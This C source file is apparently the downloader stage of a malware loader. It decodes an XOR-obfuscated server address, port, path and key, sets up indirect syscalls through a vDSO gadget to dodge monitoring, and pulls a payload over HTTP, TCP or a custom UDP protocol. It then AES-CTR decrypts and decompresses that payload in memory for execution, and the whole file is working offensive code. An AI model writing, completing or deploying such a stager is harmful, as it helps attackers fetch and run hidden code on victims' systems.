#define _GNU_SOURCE
#include "aes.h"
#include "downloader_api.h"
#include "net_utils.h"
#include "syscalls.h"
#include "tinf.h"
#include "utils.h"

/* Configurable Options - from Makefile */
#ifndef ENCODED_HOST
#define ENCODED_HOST 0x00
#endif
#ifndef ENCODED_PORT
#define ENCODED_PORT 0x00
#endif
#ifndef ENCODED_PATH
#define ENCODED_PATH 0x00
#endif
#ifndef ENCODED_KEY
#define ENCODED_KEY 0x00
#endif
#ifndef CONFIG_XOR_KEY
#define CONFIG_XOR_KEY 0x5A
#endif
#define BUFFER_SIZE 65536

#ifdef DEBUG
#define DEBUG_PRINT(fmt, args...) debug_print("DL: " fmt, ##args)
#else
#define DEBUG_PRINT(fmt, args...)
#endif

// XOR-encoded configuration arrays
static const unsigned char encoded_host[] = {ENCODED_HOST};
static const unsigned char encoded_port[] = {ENCODED_PORT};
static const unsigned char encoded_path[] = {ENCODED_PATH};
static const unsigned char encoded_key[] = {ENCODED_KEY};

// Forward declarations
static void decode_config_string(char *dest, const unsigned char *encoded,
                                 size_t max_len);
static void derive_key_from_string(const char *str, uint8_t *key);
static size_t download_file_wrapper(const char *host, const char *port,
                                    const char *path, const uint8_t *key,
                                    char **buffer);
static int build_payload_from_encrypted(char *enc_buf, size_t enc_size,
                                        const uint8_t *key, char **out_buf,
                                        size_t *out_size);
static size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
                           const uint8_t *iv);

// Entry point called by _start
void downloader_main(struct download_result *res) {
  /* Resolve vDSO syscall gadget before any other syscalls */
  init_indirect_syscalls();

  if (!res) {
    DEBUG_PRINT("No result struct passed\n");
    return;
  }

  char host[256];
  char port[16];
  char path[256];
  char key_str[256];
  uint8_t key[16];

  decode_config_string(host, encoded_host, sizeof(host));
  decode_config_string(port, encoded_port, sizeof(port));
  decode_config_string(path, encoded_path, sizeof(path));
  decode_config_string(key_str, encoded_key, sizeof(key_str));
  derive_key_from_string(key_str, key);

  DEBUG_PRINT("Downloading from %s:%s%s\n", host, port, path);

  char *payload = NULL;
  size_t downloaded_size =
      download_file_wrapper(host, port, path, key, &payload);

  if (downloaded_size > 0) {
    char *final_payload = NULL;
    size_t final_size = 0;
    if (build_payload_from_encrypted(payload, downloaded_size, key,
                                     &final_payload, &final_size) == 0) {
      res->data = final_payload;
      res->size = final_size;
      DEBUG_PRINT("Payload ready: %p (%d bytes)\n", final_payload,
                  (int)final_size);
    } else {
      DEBUG_PRINT("Build payload failed\n");
      free(payload);
    }
  } else {
    DEBUG_PRINT("Download failed\n");
  }
}

// Start routine similar to main.c but calls downloader_main
__asm__(".section .init,\"ax\",@progbits\n"
        ".global _start\n"
        "_start:\n"
        "call downloader_main\n"
        "ret\n");

// IMPL

static void decode_config_string(char *dest, const unsigned char *encoded,
                                 size_t max_len) {
  size_t i = 0;
  while (i < max_len - 1) {
    if (encoded[i] == 0x00)
      break;
    dest[i] = encoded[i] ^ CONFIG_XOR_KEY;
    i++;
  }
  dest[i] = '\0';
}

static void derive_key_from_string(const char *str, uint8_t *key) {
  uint32_t temp_key[4] = {0};
  size_t len = strlen(str);
  for (int i = 0; i < 4; i++) {
    for (size_t j = 0; j < len / 4; j++) {
      temp_key[i] ^= ((uint32_t)str[i + j * 4]) << (j % 4 * 8);
    }
  }
  memcpy(key, temp_key, 16);
}

static size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
                           const uint8_t *iv) {
  struct AES_ctx ctx;
  AES_init_ctx_iv(&ctx, key, iv);
  AES_CTR_xcrypt_buffer(&ctx, (uint8_t *)data, data_size);
  return data_size;
}

static int build_payload_from_encrypted(char *enc_buf, size_t enc_size,
                                        const uint8_t *key, char **out_buf,
                                        size_t *out_size) {
  if (!enc_buf || enc_size <= 16 || !out_buf || !out_size)
    return -1;

  uint8_t iv[16];
  memcpy(iv, enc_buf, 16);
  size_t encrypted_body = enc_size - 16;
  char *cipher = enc_buf + 16;
  decrypt_data(cipher, encrypted_body, key, iv);

  unsigned int capacity = (unsigned int)encrypted_body * 10;
  char *decomp = NULL;
  int res = TINF_OK;
  unsigned int out_len = 0;

  for (int attempt = 0; attempt < 3; attempt++) {
    decomp = calloc(capacity, sizeof(char));
    if (!decomp)
      return -1;
    out_len = capacity;
    res = tinf_uncompress(decomp, &out_len, cipher, encrypted_body);
    if (res == TINF_OK)
      break;
    free(decomp);
    decomp = NULL;
    capacity *= 2;
  }

  if (res != TINF_OK || !decomp)
    return -1;
  *out_buf = decomp;
  *out_size = out_len;
  return 0;
}

// download_file implementation (adapted from main.c logic)
// Since we moved socket logic to net_utils, we use those here
static size_t download_file_wrapper(const char *host, const char *port,
                                    const char *path, const uint8_t *key,
                                    char **buffer) {
  (void)key;
  int sockfd;
  struct sockaddr_in serv_addr;
  char *temp_buffer = malloc(BUFFER_SIZE);
  if (!temp_buffer)
    return 0;
  size_t data_size = 0;

#define MAX_DOWNLOAD_SIZE (30 * 1024 * 1024)
  *buffer = malloc(MAX_DOWNLOAD_SIZE);
  if (!*buffer) {
    free(temp_buffer);
    return 0;
  }

  memset(&serv_addr, 0, sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;

  int port_num = 0;
  const char *p = port;
  while (*p) {
    port_num = port_num * 10 + (*p - '0');
    p++;
  }
  serv_addr.sin_port = htons(port_num);

  if (inet_aton(host, &serv_addr.sin_addr) == 0) {
    free(temp_buffer);
    return 0;
  }

#ifdef LISTENER_UDP
  sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
#else
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
#endif

  if (sockfd == -1) {
    free(temp_buffer);
    return 0;
  }

#ifndef LISTENER_UDP
  if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == -1) {
    close(sockfd);
    free(temp_buffer);
    return 0;
  }
#endif

#ifdef LISTENER_HTTP
  char request[BUFFER_SIZE];
  char *ptr = request;
  memcpy(ptr, "GET ", 4);
  ptr += 4;
  size_t len = strlen(path);
  memcpy(ptr, path, len);
  ptr += len;
  const char *mid = " HTTP/1.1\r\nHost: ";
  size_t mid_len = 17;
  memcpy(ptr, mid, mid_len);
  ptr += mid_len;
  len = strlen(host);
  memcpy(ptr, host, len);
  ptr += len;
  const char *end = "\r\nConnection: close\r\n\r\n";
  size_t end_len = 23;
  memcpy(ptr, end, end_len);
  ptr += end_len;
  *ptr = '\0';

  if (send(sockfd, request, strlen(request), 0) == -1) {
    close(sockfd);
    free(temp_buffer);
    return 0;
  }

  int header_end = 0;
  while (1) {
    long bytes_received = recv(sockfd, temp_buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received <= 0)
      break;
    temp_buffer[bytes_received] = '\0';

    if (!header_end) {
      char *header_end_ptr = strstr(temp_buffer, "\r\n\r\n");
      if (header_end_ptr) {
        header_end = 1;
        size_t header_length = header_end_ptr - temp_buffer + 4;
        long body_len = bytes_received - header_length;
        if (data_size + body_len > MAX_DOWNLOAD_SIZE)
          break;
        memcpy(*buffer + data_size, temp_buffer + header_length, body_len);
        data_size += body_len;
      }
    } else {
      if (data_size + bytes_received > MAX_DOWNLOAD_SIZE)
        break;
      memcpy(*buffer + data_size, temp_buffer, bytes_received);
      data_size += bytes_received;
    }
  }
#elif defined(LISTENER_TCP)
  while (1) {
    long bytes_received = recv(sockfd, temp_buffer, BUFFER_SIZE, 0);
    if (bytes_received <= 0)
      break;
    if (data_size + bytes_received > MAX_DOWNLOAD_SIZE)
      break;
    memcpy(*buffer + data_size, temp_buffer, bytes_received);
    data_size += bytes_received;
  }
#elif defined(LISTENER_UDP)
  struct sockaddr_in src_addr;
  unsigned int src_len = sizeof(src_addr);
  struct timeval tv;
  tv.tv_sec = 1;
  tv.tv_usec = 0;
  setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof tv);

  uint32_t key_hash = 0;
  for (int i = 0; i < 16; i++) {
    key_hash ^= ((uint32_t)key[i]) << ((i % 4) * 8);
  }

  char hello_packet[5];
  hello_packet[0] = 0x02;
  memcpy(hello_packet + 1, &key_hash, 4);
  uint32_t expected_seq = 0;
  int hello_retries = 0;

  while (1) {
    if (expected_seq == 0) {
      if (sendto(sockfd, hello_packet, 5, 0, (struct sockaddr *)&serv_addr,
                 sizeof(serv_addr)) == -1) {
        close(sockfd);
        free(temp_buffer);
        return 0;
      }
    }
    long bytes_received = recvfrom(sockfd, temp_buffer, BUFFER_SIZE, 0,
                                   (struct sockaddr *)&src_addr, &src_len);
    if (bytes_received <= 0) {
      if (expected_seq == 0) {
        hello_retries++;
        if (hello_retries > 20)
          break;
        continue;
      } else {
        break;
      }
    }
    if (bytes_received > 4) {
      uint32_t seq = 0;
      memcpy(&seq, temp_buffer, 4);
      if (seq == expected_seq) {
        if (data_size + bytes_received - 4 > MAX_DOWNLOAD_SIZE)
          break;
        memcpy(*buffer + data_size, temp_buffer + 4, bytes_received - 4);
        data_size += bytes_received - 4;
        expected_seq++;
        sendto(sockfd, &seq, 4, 0, (struct sockaddr *)&src_addr, src_len);
      } else if (seq < expected_seq) {
        sendto(sockfd, &seq, 4, 0, (struct sockaddr *)&src_addr, src_len);
      }
    }
  }
#endif
  close(sockfd);
  free(temp_buffer);

  if (data_size > 0 && data_size < MAX_DOWNLOAD_SIZE) {
    char *exact_buf = realloc(*buffer, data_size);
    if (exact_buf) {
      *buffer = exact_buf;
    }
  }

  return data_size;
}
